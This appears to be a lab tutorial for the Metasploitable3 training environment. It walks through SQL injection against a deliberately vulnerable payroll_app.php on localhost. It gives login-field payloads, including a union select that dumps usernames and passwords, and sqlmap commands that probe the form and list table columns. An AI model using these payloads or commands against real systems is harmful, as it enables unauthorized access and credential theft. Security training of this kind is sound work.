<b>For this tutorial you will need the following tools</b>

* Browser (Prefarably Mozilla)
* Burpsuite
* SQLMap

1. <b>Try and login using the following credentials:</b>

   | Field     | Value    |
   | --------- |:--------:|
   | USERNAME  | admin    |
   | PASSWORD  | admin    |  

RESULTS: The webpage will display your username and no content
 
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-1.png "STEP 1")
   
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-1.png "Result 1")
2. <b>Try and login using the following credentials:</b>

   | Field     | Value    |
   | --------- |:--------:|
   | USERNAME  | '        |
   | PASSWORD  | admin    |  

RESULTS: The webpage will be blank
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-2.png "STEP 2")
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-2.png "RESULT 2")
   
3. <b>Try and login using the following credentials:</b>

   | Field     | Value    |
   | --------- |:--------:|
   | USERNAME  | ' or 1;#'|
   | PASSWORD  | admin    |  

RESULTS: The web page will return all the user content
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-3.png "STEP 2")
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-3.png "RESULT 2")
4. <b>Use SQLMap to extract the database using the following commands:</b>

   ```
   sqlmap -u http://127.0.0.1:7000/payroll_app.php --data="user=admin&password=admin&s=OK" -p user --method POST
   ```

RESULTS: SQLMap will identify whether the web application is vulnerable to SQL Injection
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-4-sqlmap.png "STEP 4")
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-4-1.png "RESULT 4")
   
5. <b>Use SQLMap to extract the columns in the table</b>

   ```
   sqlmap -u http://127.0.0.1:7000/payroll_app.php --data="user=admin&password=admin&s=OK" -p user --method POST --columns
   ```

RESULTS: SQLMap will retrieve the columns on the application tables
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-5-1.png "STEP 5")
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-5-2.png "RESULT 5")   

6. <b>Use the fields retrieved to retrieve the user passwords:</b>

   | Field     | Value                                       |
   | --------- |:-------------------------------------------:|
   | USERNAME  | ' or 1 union select 1,username,password,1;#'|
   | PASSWORD  | admin                                       |  

RESULTS: The web page will return the user credentials
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/step-6.png "STEP 5")
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-6-1.png "RESULT 6")
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-6-2.png "RESULT 6")  
   ![alt text](https://github.com/ACIC-Africa/metasploitable3/blob/master/images/payroll_app/result-6-3.png "RESULT 6")   
